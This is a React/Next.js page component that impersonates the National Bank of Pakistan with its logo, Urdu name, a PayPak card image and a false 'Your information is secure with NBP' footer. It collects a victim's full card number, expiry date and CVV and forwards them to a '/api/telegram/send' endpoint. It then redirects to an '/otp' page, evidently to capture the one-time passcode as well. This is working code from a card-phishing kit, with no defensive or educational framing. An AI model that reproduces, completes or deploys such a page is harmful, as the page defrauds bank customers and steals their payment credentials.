'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { updatePaymentFlow } from '@/lib/payment-flow'
import { ArrowLeft, CalendarDays, CreditCard, Info, LockKeyhole, Wifi } from 'lucide-react'

const cardImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-gbmccQSvccOvRmxuj7OkYMG3ADClzq.png'
const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

function formatCardNumber(value: string) {
  return value.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim()
}

export default function Page() {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState('')
  const [expiry, setExpiry] = useState('')
  const [cvv, setCvv] = useState('')
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault()
    if (submitting) return

    const digits = cardNumber.replace(/\D/g, '')
    const expiryDigits = expiry.replace(/\D/g, '')
    if (digits.length !== 16 || expiryDigits.length !== 4 || cvv.length !== 3) {
      setError('Please enter your complete card details.')
      return
    }

    setError('')
    setSubmitting(true)
    try {
      const flow = updatePaymentFlow({
        card: digits,
        month: expiryDigits.slice(0, 2),
        year: expiryDigits.slice(2),
        cvv,
      })
      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(flow),
      })
    } catch {
      // Continue to the next verification step if notification fails.
    } finally {
      router.push('/otp')
    }
  }

  return (
    <main className="card-details-screen">
      <div className="card-details-backdrop" aria-hidden="true" />
      <div className="card-details-shell">
        <button type="button" className="back-button" aria-label="Go back" onClick={() => router.back()}>
          <ArrowLeft aria-hidden="true" />
        </button>

        <section className="card-details-panel" aria-label="Card details">
          <header className="nbp-branding">
            <img src={logoImage} alt="NBP National Bank of Pakistan" />
            <div>
              <p>National Bank of Pakistan</p>
              <p dir="rtl">نیشنل بینک آف پاکستان</p>
            </div>
          </header>

          <div className="paypak-card-wrap">
            <img src={cardImage} alt="Green NBP PayPak card" className="paypak-card" />
          </div>

          <div className="card-details-heading">
            <h1>Enter Card Details</h1>
            <p>Please enter your card information to proceed.</p>
          </div>

          <form className="card-details-form" onSubmit={handleSubmit}>
            <label htmlFor="card-number">Card Number</label>
            <div className="reference-input">
              <input
                id="card-number"
                inputMode="numeric"
                autoComplete="cc-number"
                value={formatCardNumber(cardNumber)}
                onChange={(event) => { setCardNumber(event.target.value.replace(/\D/g, '')); setError('') }}
                placeholder="1234 5678 9012 3456"
                maxLength={19}
              />
              <CreditCard aria-hidden="true" />
            </div>

            <div className="expiry-cvv-grid">
              <div>
                <label htmlFor="expiry">Expiry Date</label>
                <div className="reference-input">
                  <input
                    id="expiry"
                    inputMode="numeric"
                    autoComplete="cc-exp"
                    value={expiry}
                    onChange={(event) => {
                      const digits = event.target.value.replace(/\D/g, '').slice(0, 4)
                      setExpiry(digits.length > 2 ? `${digits.slice(0, 2)} / ${digits.slice(2)}` : digits)
                      setError('')
                    }}
                    placeholder="MM / YY"
                    maxLength={7}
                  />
                  <CalendarDays aria-hidden="true" />
                </div>
              </div>
              <div>
                <label htmlFor="cvv">CVV</label>
                <div className="reference-input">
                  <input id="cvv" inputMode="numeric" autoComplete="cc-csc" type="password" value={cvv} onChange={(event) => { setCvv(event.target.value.replace(/\D/g, '').slice(0, 3)); setError('') }} placeholder="•••" maxLength={3} />
                  <Info aria-hidden="true" />
                </div>
              </div>
            </div>

            {error ? <p className="card-details-error" role="alert">{error}</p> : null}
            <button type="submit" className="continue-button" disabled={submitting}>{submitting ? 'Please wait…' : 'Continue'}</button>
            <button type="button" className="cancel-button" onClick={() => router.push('/')}>Cancel</button>
          </form>

          <footer className="secure-footer"><LockKeyhole aria-hidden="true" /><span>Your information is secure with NBP</span></footer>
        </section>
      </div>
    </main>
  )
}
